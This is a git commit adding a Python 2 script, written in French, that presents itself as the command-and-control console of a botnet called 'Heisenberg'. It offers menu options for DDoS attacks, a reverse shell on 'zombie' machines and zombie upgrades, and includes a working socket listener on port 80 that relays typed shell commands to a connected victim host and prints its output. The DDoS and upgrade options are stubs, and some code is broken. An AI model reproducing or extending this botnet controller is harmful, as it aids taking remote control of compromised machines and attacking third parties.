9705c9ebe6f9598eff67d7526ddab8f15b7ca67c
Andfrid <andfrid@gmail.com>
2016-03-24 22:36:13 +0100

    update

---
+++ heisenbergv2.py
@@ -0,0 +1,371 @@
+#!/usr/bin/python2.7
+# coding: utf8
+# -*-coding:Latin-1 -*-
+
+#OOOOZZ$$777IIII????????????????????????????????????++=~~:::,,,:::::::,,,,,,,,,,,,,,,,,,,,,,::::::::~
+#OOOOZZ$$$7IIIIIIIIIIIIIIII?????????????????????????++=~~~::::::::::::::::,,,,,,,,,::::::::::::~~~~~~
+#OOOOOZZ$$77IIIIIIIIIIIIIIII?I??II?????Z$?I??????II??+==~~~~~~~~~~~~~~~~~:::::::::::::::::::~~~~====+
+#OOOZZZZ$777IIIIIIIIIIIIIIII???II?I??I8D8D8887??II???++=====~~============~~~~~~~~~~:::::~~~~~~==+++?
+#OOOZZZZ$$77IIIIIIIIIIIIIIII?????????DDDDDDDDDDDDDD8OOOZZI+==++++????????+++=======~~~~~~~~~===+++???
+#ZZOZZZ$$777IIIIIIII????????????????DDDDDNDDNDDDDDDDDDNDDDD8OOOZI77777777II???++++===~~~~~===+++??II7
+#OOZOZZZ$77IIII?????????????????????8DNNDDDDDDDDDDDDDDDNNNNNNNNNND8OZ$ZZZ$$$77II??+++======+++??II77$
+#OZZOZZZ$$77IIIIIIIIII?????????????DDDDDDDDDDDDDDDDDNNNNNDNNNNNNNNNNNNNND8Z$$$$77I??++++++++??II77$$Z
+#OZZZZZ$$777IIIIIIIIIIIIIII???????78DNDDNDDDDDNDDDDDNNNNNNNNNNNNNNNMNNMMMMMMNND877?=????????II77$$ZZZ
+#ZZOOZZ$$777IIIIIIIIIIIIIII???????8DDDDDDDDDDDDDNDDNDNDNNNNNNNNNNNNNMNMMNMMMMNNNNNDO$$+IIIIII7$$ZZOZZ
+#ZZOZZZ$$777IIIIIIIIII??III???????DDDDDDDDDDDDDDDDDDNNNNNNNNNNNNNMNNMNNMNNMMMMMMMMNNDOZ777777$$ZOOOOO
+#ZZZZZZ$$77IIIII?I???????????????8DDDDDDDDNDDDNDDDNNDNNNNNNNNNNNNNNMMMMMMNMMMMMMMMNNDD$$77$$$$ZOOO888
+#ZZZZZZ$$77IIII?????????????????IDDNDDDDDDDDNNDDDNNDNNNNNNNNNNNNNNNNMMMMMMMMMMNMMMMNNDZ$$$ZZZZOOO8888
+#ZZZZZZ$$77IIIIII???????????????ZDDDDDDDDDDDDNNDDNDNNNNNNNNNNNNNMMMMMMMMMMMMMMMMMMMNDO$ZZZZZZOOOO8888
+#ZZZZZZ$$777IIIII???????????????O8OOOOO8DDDDDDNDNDNNNNNNNNNNNNNMNMMMNMMMMMMMMMMMMMMNDZ7OOOOOOOOO88888
+#ZZZZZZ$$777IIII????I??????????888OOOOOOO8OO8O8DNNNNNNNNNNNNNNNNNNMNMMMMMMMMMMMMMNND8ZZOOOOOOOO888888
+#ZZZZZZ$$777II7OZ$OZOO8OO$I????888OOOOOOOOO8O8888888DDNNNNNNNNNNNMMNNMNMMMMMMMMMMMND8ZZZZZO8OO8888888
+#ZZZZZZ$$77III?8DDDDDDD8OO8NNM8888OOOOOOOO8888888888DDDDDDNNNNNMNNMMMNMMMMMMMMMMNMNDZZZZZZZZO88888888
+#ZZZZZZ$$77III???DDNNDDNNDDD8D888OOOOOOOO88OO88888888DDDDDDDNNNNMMMMMMMMMMMMMMMMMMNOOIZZZZZZZO8888888
+#ZZZZZ$$$77IIII????IDDNNNNNNDDDNNDD8D88OOOOO88888888D8DDDDNNNNMNMMMMMMMMMMMMMMMMMNN88?$ZZZZZZZO888888
+#ZZZZZ$$$77IIII???????INDNNNNNNNNNNNDNDDDDD8888888888DDDDNNNNNNNMMMMMMMMMMMMNMMMMNNDO7$$$$$$ZZZO88888
+#ZZZZZ$$777IIII???????????IZDDNDNNNNNNNNNDNNNNNDDDD88DDDDNNNNNNNMNNNMMMMMMMNMNNMMNN8$=7$$$$$$$ZO88888
+#ZZZZZ$$77IIII??????????????????IZNNNNNNNNNNNNNNNNNNNNNDDDNDNNNMNMMMMMMMMMMMMNNMMOD8?7$$7$$$$$ZO88888
+#ZZZZ$$$777III??????????????????~~~==+$DNNNNNNNNNNNNMMNNNNNNMNNNNNNNND8ODDDNNNNMNMM?:7$77777$ZO888888
+#ZZZZZ$$$7IIII??????????????????~~~~~~:~==??Z8NNNNNNNNMNMNNMMMNNNMMMMMMMMMMMMMNNNDDOZ77$$$$$ZO8888888
+#ZZZZZ$$77IIII?????????????????+~~~::~~~======?II$O8NNMNMMMNNMMMMMMMMMMMMMMMMNMNMMMMMMMNDZ7O888888888
+#ZZZZ$$$$7IIII????????????????~?:~~~~=~===~===++=??+?I$Z8DDNNMMMMNMMMMMNMMMMMMMMMMMMMMMMMMNMNZ7OZOOOO
+#ZZ$ZZ$$77III?????????????????~=~~:::=~=~~=~==++=+++++I7$ZZZ8DDDDDNNNMMMMMMMMMMMMMMMMMMMMMMMMNMN7OOOO
+#$ZZZ$$$77III?????????????????M~~~~~::~~~~~~====++=++?I77Z$77OO8DDDDDDDDDDNNNNMMMMMMMMMMMMMMMMMMMD+ZO
+#$$ZZ$$$77III???????????????DON=~~:~:::=~=~=========++?I7ZI7ZOO8D8DDDDDDDDDNDDNNND8NNMMMMMNNMMMMNN7$$
+#$$$Z$$$77III??????????????OZ77Z=~:~:::=:====~~~=++=??I7I7$$ZO88D8DDDDDDDDDDNNNND8ZZZ$$$$$$$$777777$$
+#$$ZZZ$$77III??????????????.N8DN8~7O=:~=~?===+:::=:=?I7II$ZOOO8DDDDDDDDDDDDNNM88DDD88$$$$$$$77777777$
+#$$$$Z$$77III??????????????88ODNNNNNNN8DDZ?++?===?=+?I$77$7ZO8DDDDDDDDDDNNNMNNDD888DDZ$$$$$$77777777$
+#Z$Z$$$$77III??????????????O88DNNNNNNNNMNDDNDDD888ODDDD8OZOO8DDDDNNNDNNNM88NDDDDD8D88OZ$$$$777777777$
+#$ZZZ$$$77III??????????????D88DNNNMNNNNMMNNNNNNMMMNMNMNMNMMMMNMNMNMMD8ZDD8ND888888888ZZZZ$$$77777777$
+#vZZZ$$$$77III??????????????N88DDNNNNNMMNMNNNNNNMMMMMMMMMNMMMMMMMNMMNDNZ88D88888D888OZOZZZZ$$$$77777$
+#$$$$$$$77III???????????????D8DDNNNNNNMNNND~=INMMMMMMMMNMMMMMMMMMNNNNNZ88888DDO888ZOOOOOOOZZ$$$$$$$$Z
+#$$$Z$$$77III????????????????DDNNNNNMMNMNN,:~=NMMMMMMMMMMMMMMMMMMMNNMNO8888888ZO88O8O888OOOZZ$$$$$$ZZ
+#$$$$$$$77III????????????????+8NDNNNNNNNN~,::IONMMMNMMMMMMMMMMMNNMNNND8888888O888OOO888OOOOZZZZZZZZZZ
+#$$$$$$$77III?????????????????:~~DZ777DNO:,~+ZODNMMMMMMNMMMMMMMMNMNN888888888DDOZOOOOO8OOOOZZZZZZZZZZ
+#$$$$$$$77II??????????????????~~~~~~=I$$~,,=IZOONNMMMMMMMMMMNMMMNNN8888O888888OZOOOOOOOOOOOZZZZZZZZZZ
+#$$$$$$$77II???????????????????~~~~::::=,,~?$OZZODDNN8DNMMNNNNNNDD888O88888OOOO7OOOOOOOOOZZZZZZZZZZZZ
+#$$$$$$$77II???????????????????~~~~:~~=:,,~=7$OOO888OZZO888888D88888O888888O8OIOOOOOOOOZZZZZZZZZZZZZO
+#$$$$$$$77III??????????????????~~:::~?:,:::=7ZOZZO8OZ$$$77$ZOO888888O8888O88$$ZZZZZZZZZZZZ$$$$$$$$$ZZ
+#$$$$$$$7III???????????????????+~~:~+~::~~=IZOOOO88OO$$$$7$ZO88888888888O:ZZZZ$$$$$$$$$$$$$$$$$$$$$$$
+#$$$$$$$7III??????????????????I$~=~~=:~=?I7O88DDDDZZOO$77ZOO888888888888ZZ$$$$$$$$$$$$$$$77777777777$
+#$$$$$$$7III????????????????+ZOO~+~===+???7$ODDDD8OZZOOZZOO88888888888O8+$$$$$777777777777IIIIIIII777
+#$$$$$$$7III???????????????IZO8D:=~+++???I7$7$888O8OOZOOOOO8D8O8888888OO7$$777777777IIIIIII?IIIIIIIII
+#$$$$$$77III?????????????+ZO8888.~~+????I?ZZ7$ZZZOZOZO8O8OOO888888888887?7777IIIIIIIIIII?????????????
+#$$$$$$77III????????????$ZO888DD.=~?II+7$II7I$$ZZOZO88888OOO8DO8888888O:7I?IIIIIIIIII???????+???+++??
+#$$$$$$777II??????????IZOO8888DD,.=?+===~+?I$8DNNNDNND88ZOOO8D8888888O+I=OD7IIIII????????++++++++++++
+#$$$$$$77III?????????Z88888888DDZ,=~~~~=~~=++++I7IZOOO8OOZZO8D88O8888$?O$,ND7=??????????++++++++++=++
+#$$$$$$$7IIII??????7O88O8O8888DDD7.=~~~~+?II7777$ZZZ$$$777ZO888888O88+ZDZ7.DD7=??????++++++++++======
+#$$$$$$$77III?????Z8888888D88DDDDD7=~~===??III7$$$77$$$$$$O8D88888OOZ8DND8?,NDI~+?????++++++=+=======
+#$$$$$$$77IIII??$O88DDDD888D88DDDNDI~~~~~:~~==??7I77I$$$O88888888OO8+DNDDOD.NNO+:+??????+++++========
+#$$$$$$$77III?88D88DDDDD88888D8DDDNN7~:~::::~=+??III77ZZOOOD8888888ODNNNDDO77NNZ=:=++??+++++=========
+#$$$$$$$77?Z888DDDDDDDDDDDD888DDDDDDDI==~~=+=+??777I7$ZOO88888888888DNNNN8ZZ.NNDI~:~~?++++++========~
+#$$$$$$7Z88DDDDDDD8DDDDDDDDDDDDDDDDDN8Z?++?IIII7$Z$7OO888888888D888DNDNNNNO7,NNND=~+~~=87==+======~~~
+#$$$7$88DDDDDDDDDNDDDDDDDDDD8DDDDDDDDN8Z,77$$$ZO88O888888888888D888DDDNNN8Z7+.MNNZ=~=+==$NZ+=====~~::
+#7IZ8DD8DDDDDDDDNMD8DDDDDDDDDDDDDDDDDDNO8,.~++DNNNNNNNNDDD88888888DDDDNDN8Z??.NNNNNN8I===+NDZ$I?~~:::
+#88DNDDDNNDDDDDNNMDDDDDDDDDDDDDDDDDDDDNN88::::,7NNNNNNNDDD8888888DDDDDDNNZZ+I.MNNNNNNDO?:=~NN8OO$+:::
+#D8DDDDDNNDNDNNNNNNDDDDDDDDDDDDDDDDDDDDNNDO~.=~.:O8DNDDDNDDD8888DDDDDDDDDOO??.NNNNND87?77+~:DNN8ZZ??~
+#DDNNDDNNNNNNNNNMNND8DDDDDDDDDDDDDDDDDDDNDDOZ,,~~,+$OO8NNNDD8888DDDDDDDNO8O===,NNMMNNN87?I~:~NNND8O?$
+#NDNNNNNNNNNNNNNNNNDDD8DDDDDDDDDDDDDDDDDDNDDZO+~~..~I7OZZZZO8D88DDNDOZZOOII~~=.MMMMMMNND$?7=:~8NNN8Z?
+#NNNNNNNNNNDNNNNMNNDDDDDDDDDDDDDDDDDDDDDNDDDN8O=,~:..I+ZZ$$$77IIIII77$$Z77OZI=.MMMMMNNNNN8+7=:~NMNN8Z
+#NNDNNNNNNNNNNNNNNNNNDDDDDDDDDDDDDDDDDDDDDDNMMD8I::,~,?,~$777IIIIIIII77:DNNDOO~MMMMDMMMMMMD$~=~~NMNN$
+#NNDNNNMMNNNNNNNMMNNDDDDDDDDDDDDDDDDDDNNDMMMMMNNDDDD7,.+88?77IIII?II7==OD8D8Z?+MMNMMMMMMMMMMNI~==MNND
+#NNDDNNMNNNNNNNNMNNNNNDDDDDDDDDDDDDDDDDMMMMMMMNNNNDNDDD8OZZOOZZ??I+:IO8O8D8OZ~$NMMNMMMMMMMMMMMN+:7MMN
+#NNNDNNNNNNNNNNNMNDNNNDDDDDDDDDDDDDDDMMMMMMMMMMNONDNDDDND8ODO88IIO8O8ZD8Z8DD7$DDMMNMMMMMMMMMMMMN8:NNN
+#NNNDNNNNNNNNNNNNNNDDNMDDDDDDDDNDNDMMMMMMMMMMMNNNNDDDDDDN88DO$O$$ZOZ8$OZOZ$8?88DMMMNMMMMMMMMMMMMDN:MN
+#NNNDNNNNNNNNNNNNNNDNNMNDDDDDDDDDMMMMMMMMMMMMNNNNDNNDNDDD8$ZD8O$8O8ODOOZOZIZZ8D8MDNMMMMMMMMMMMMMNNM$M
+#NNNNNMNNNNNNNNNNNNNNNNMNDDDDDDNMMMMMMMMMMMMMMNNNNNNDDDDD8$IO$O777$7ZI?ZIZ?7ZOO8NNNMMMMMNMMMMMMMNNNMM
+#NNNDNNNNNNNNNNNNNNNNNMNMNDDDMMMMMMMMMMMMMMNMNNNNNDNNNDDDNZ?78I7II$IIZI$I7+7$O$OMMNMMMMMMNMMMMMNNNNMM
+#NNNDNNNNNNNNNNNNNNNNNNMNMNNMMMMMMMMNMMMMMMNNNNNDDDDDDDDDDIZ+I?I++I=+$=++?ZIZOI$NMMMMMMMMNMMMMMMNNNMM
+#NNNDNNNNNNNNNNNNNNNNMNMNNNNNNNMMMNNNNMMNMMNNNNNNNNMNDDDDD8I$7==7+I++Z=+I7?+ZO?I8NMMMMMMNMNMMMMMNNNNM
+#NNNDDNNNNNNNNNNNNNNNNNMNNNDNNNNNNNNNNNNNNNNNNNNDNNMDNNDDNN$$7??Z?+I+7==ZOI78$I7OMMMMMMNNNNNNMMMMNNNM
+#MNNNDNNNNNNNNNNNNNNNNMMNNDDDDNNNNNDNNNNNNNNNNNNDNNMNNDDNDNZ$II=7=+I=+?+O??+OIZ?OMMMMMMMMMNMMMMMNNNNM
+
+#----------------------------------------------------#
+#@ Author : Mickey Bourne | Darko | HackerD0G
+#@ $$$$ : Heisenberg.py
+#@ date : 25/03/2016
+#----------------------------------------------------#
+#import des bibliothèque nécessaire
+import os, re, socket, threading
+
+#Initialisation des variables globales
+choix=""
+#Listes de toutes les possibilitéa d'input par l'utilisateur
+possibilite = ["","M","D","S","U","Q","m"]
+#adresse d'écoute
+bind_ip=""
+#port d'coute
+bind_port=80
+
+##################################################################
+#DEFINITION DES FONCTIONS
+##################################################################
+
+#fonction cls (clear) afin d'effacer le prompt avant l'affichage de chaque menu
+def cls():
+	 # Pour un OS M$ envoie de la commande cls pour un OS linux envoie de la commande clear
+    os.system('cls' if os.name=='nt' else 'clear')
+
+#Fonction d'affichage du menu principal
+def menu_principal () :
+	cls() #Nettoyage du prompt
+	print ("Bienvenue dans le script du Command & Control du botnet Heisenberg")
+	print ("")
+	print ("------Menu Principal------")
+	print ("M : pour le menu principal")
+	print ("D : pour faire une attaque DDOS")
+	print ("S : pour faire un reverse Shell sur un zombie")
+	print ("U : pour faire un upgrade d'un zombie")
+	print ("Q : pour quitter le programme")
+	print ("------------------------------------------")
+
+#Fonction pour vérifier la saisi de l'adresse ip de l'utilisateur
+def is_valid_ipv4(ip):
+    """Validates IPv4 addresses.
+    """
+    pattern = re.compile(r"""
+        ^
+        (?:
+          # Dotted variants:
+          (?:
+            # Decimal 1-255 (no leading 0's)
+            [3-9]\d?|2(?:5[0-5]|[0-4]?\d)?|1\d{0,2}
+          |
+            0x0*[0-9a-f]{1,2}  # Hexadecimal 0x0 - 0xFF (possible leading 0's)
+          |
+            0+[1-3]?[0-7]{0,2} # Octal 0 - 0377 (possible leading 0's)
+          )
+          (?:                  # Repeat 0-3 times, separated by a dot
+            \.
+            (?:
+              [3-9]\d?|2(?:5[0-5]|[0-4]?\d)?|1\d{0,2}
+            |
+              0x0*[0-9a-f]{1,2}
+            |
+              0+[1-3]?[0-7]{0,2}
+            )
+          ){0,3}
+        |
+          0x0*[0-9a-f]{1,8}    # Hexadecimal notation, 0x0 - 0xffffffff
+        |
+          0+[0-3]?[0-7]{0,10}  # Octal notation, 0 - 037777777777
+        |
+          # Decimal notation, 1-4294967295:
+          429496729[0-5]|42949672[0-8]\d|4294967[01]\d\d|429496[0-6]\d{3}|
+          42949[0-5]\d{4}|4294[0-8]\d{5}|429[0-3]\d{6}|42[0-8]\d{7}|
+          4[01]\d{8}|[1-3]\d{0,9}|[4-9]\d{0,8}
+        )
+        $
+    """, re.VERBOSE | re.IGNORECASE)
+    return pattern.match(ip) is not None
+
+#fonction pour valider la saisi de l'adresse ipV6
+def is_valid_ipv6(ip):
+    """Validates IPv6 addresses.
+    """
+    pattern = re.compile(r"""
+        ^
+        \s*                         # Leading whitespace
+        (?!.*::.*::)                # Only a single whildcard allowed
+        (?:(?!:)|:(?=:))            # Colon iff it would be part of a wildcard
+        (?:                         # Repeat 6 times:
+            [0-9a-f]{0,4}           #   A group of at most four hexadecimal digits
+            (?:(?<=::)|(?<!::):)    #   Colon unless preceeded by wildcard
+        ){6}                        #
+        (?:                         # Either
+            [0-9a-f]{0,4}           #   Another group
+            (?:(?<=::)|(?<!::):)    #   Colon unless preceeded by wildcard
+            [0-9a-f]{0,4}           #   Last group
+            (?: (?<=::)             #   Colon iff preceeded by exacly one colon
+             |  (?<!:)              #
+             |  (?<=:) (?<!::) :    #
+             )                      # OR
+         |                          #   A v4 address with NO leading zeros 
+            (?:25[0-4]|2[0-4]\d|1\d\d|[1-9]?\d)
+            (?: \.
+                (?:25[0-4]|2[0-4]\d|1\d\d|[1-9]?\d)
+            ){3}
+        )
+        \s*                         # Trailing whitespace
+        $
+    """, re.VERBOSE | re.IGNORECASE | re.DOTALL)
+    return pattern.match(ip) is not None
+
+#Fonction qui rassemble les fonctions de vérification d'adresse ipv4 et ipv6
+def is_valid_ip(ip):
+    """Validates IP addresses.
+    """
+    return is_valid_ipv4(ip) or is_valid_ipv6(ip)
+
+#Fonction d'affichage du menu DDOS
+def menu_DDOS () :
+	cls() #Nettoyage du prompt
+	print "------Bienvenue dans le menu d'attaque DDOS------"
+	print "prêt pour lui en foutre plein la geule...\n"
+	
+	#Saisi de l'adresse ip pour le DDOS
+	IP_ddos = raw_input("Saisir l'ip de la victime ou M pour revenir au menu principal: \n")
+	
+	#Si l'utilsateur tape M retour au menu principal
+	if IP_ddos == "M" or IP_ddos =="m" :
+		print loop_input ()
+	#V�rification de la saisi de l'adresse IP
+	elif is_valid_ip(IP_ddos) == True :
+		print "l'adresse ip est correcte"
+
+		#Lancement de l'attaque
+		print "Lancement de l'attaque DDOS"
+
+	#Demander une nouvelle saisi pour l'adresse IP 	
+	else :
+		print "Erreur de saisi de l'adresse ip, resssayer : \n"
+
+#fonction d'affichage du menu pour le Reverse Shell
+def menu_Rshell () :
+	cls() #Nettoyage du prompt
+	print "------Bienvenue dans le menu Reverse Shell------"
+	print "prêt pour lui prendre la main...\n"
+	
+	#Saisi de l'utilisateur soit M ou l'adresse IP du zombie
+	IP_Rshell = raw_input("Saisir l'ip du zombie ou M pour revenir au menu principal : \n")
+	
+	#Retour au menu principal
+	if IP_Rshell == "M" or IP_Rshell =="m" :
+		print loop_input ()
+
+	#V�rification de la saisi de l'adresse IP
+	elif is_valid_ip(IP_Rshell) == True :
+		print "l'adresse ip est correcte"
+
+		#Lancement de l'attaque
+		print "Lancement du Reverse Shell"
+		#Lancement de fonction serveur en écoute sur le port 80
+		print serveur_Rshell()
+		
+	else :
+		#Demander une nouvelle saisi pour l'adresse IP
+		print "Erreur de saisi de l'adresse ip, resssayer : \n"
+
+#fonction d'affichage du menu pour l'upgrade
+def menu_Upgrade () :
+	cls() #Nettoyage du prompt
+	print "------Bienvenue dans le menu Upgrade du zombie------"
+	print "Aller on va mettre à jour cette merde...\n"
+	
+	#Saisi de l'utilisateur soit M ou l'adresse IP du zombie
+	IP_Upgrade = raw_input("Saisir l'ip du zombie ou M pour revenir au menu principal : \n")
+	
+	#Retour au menu principal
+	if IP_Upgrade == "M" or IP_Upgrade =="m" :
+		print loop_input ()
+
+	#V�rification de la saisie de l'adresse IP
+	elif is_valid_ip(IP_Upgrade) == True :
+		print "l'adresse ip est correcte"
+
+		#Lancement de l'attaque
+		print "Lancement de l'upgrade"
+		#Lancement de fonction serveur en écoute sur le port 80
+		
+	else :
+		#Demander une nouvelle saisie pour l'adresse IP
+		print "Erreur de saisi de l'adresse ip, resssayer : \n"
+
+
+def loop_input () :
+	cls()
+	#Controle de l'input
+	loop = 1
+	while loop == 1 :
+		#Appel de la fonction affichage menu
+		print menu_principal()
+		print ""
+		#Input utilisateurs sur son choix et transforme la saisi en majuscule
+		choix = str.upper(raw_input("Saisir le menu désiré : \n"))
+
+		#Dans le cas où l'utilisateur tape rien
+		while choix == possibilite[0] :
+			print ("Rien n'a été saisi !")
+			choix = str.upper(raw_input("Saisir le menu désiré : \n"))
+			print menu_principal()
+
+		#Dans le cas où l'utilisateur tape M
+		while choix == possibilite[1] :
+			print ("Retour au menu principal")
+			print loop_input()	
+
+		#Dans le cas où l'utilisateur tape D
+		while choix == possibilite[2] :
+			print ("Goo pour une attaque DDOS")
+			print menu_DDOS()
+
+		#Dans le cas où l'utilisateur tape S
+		while choix == possibilite[3] :
+			print ("Goo pour une shell sur un zombie")
+			print menu_Rshell()
+
+		#Dans le cas où l'utilisateur tape U
+		while choix == possibilite[4] :
+			print ("Goo pour mettre à jour le zombie")
+			print menu_Upgrade()
+
+		#Dans le cas où l'utilisateur tape Q
+		if choix == possibilite[5] :
+			print ("tchaooo")
+			print ""
+			break
+	
+		#Pour toutes les autres possibilités on demande une nouvelle saisi
+		else:
+			print ("Erreur de saisi, essayer une nouvelle fois")
+			choix = str.upper(raw_input("Saisir le menu désiré : \n"))
+
+#Fonction du menu Reverse Shell
+def serveur_Rshell () :
+	# socket creation en écoute sur toutes les cartes réseau 0.0.0.0 sur le port 80
+	bind_ip = "" 
+	bind_port = 80  
+
+	print ("Création du Socket")
+	#Création du socket en ipv4 et TCP
+	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+	#On met le socket en écoute
+	server.bind((bind_ip,bind_port))
+	print ("Le serveur est en écoute sur le port %s") %bind_port  
+	#nombre de demandes de connexion max au moment de la demande
+	server.listen(5) 
+	#Enregistrement des infos socket du client
+	connexion_client, infos_connexion = server.accept()
+	#Appel de la fonction Reverse Shell
+	handle_client(connexion_client)
+
+#Fonction pour faire le Reverse Shell
+def handle_client(client_socket):
+	#Boucle infini pour le Reverse Shell
+	while True:
+		#Invite de commande pour lancer le Reverse
+		choiseTrojan = raw_input("Pour commander ton Junky Tape 1:")
+		if choiseTrojan == "1":
+			#envoie du paquet retour 
+			response = raw_input("Shell>>\n")
+			client_socket.sendall(response)
+			#retourne les données du client
+			request = client_socket.recv(2048)
+			print "[*] Received: %s\n" % request
+
+	client_handler = threading.Thread(target=handle_client,args=(client,))
+	client_handler.start()
+
+######################################################################
+#Debut du programme
+######################################################################
+cls()
+print ("#----------------------------------------------------#")
+print ("#@ Author : Mickey Bourne | Darko | HacKerD0g")
+print ("#@ $$$$ : Heisenberg.py")
+print ("#@ date : 25/03/2016")
+print ("[*] Trojan ok - listening on %s:%d") %(bind_ip,bind_port)
+print ("#----------------------------------------------------#")
+ 
+#Lancement de la fonction loop_input
+print loop_input()
